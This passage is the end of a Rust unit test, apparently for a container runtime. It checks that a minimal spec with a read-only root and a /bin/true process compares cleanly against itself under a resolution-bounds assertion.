            "root": { "path": EXPECTED_ROOT, "readonly": true },
            "process": { "args": ["/bin/true"], "cwd": "/", "user": { "uid": 0, "gid": 0 } }
        });
        assert_within_resolution_bounds(
            &spec_from(minimal.clone()),
            &spec_from(minimal),
            Path::new(EXPECTED_ROOT),
        )
        .expect("a minimal spec should compare cleanly against itself");
    }
}
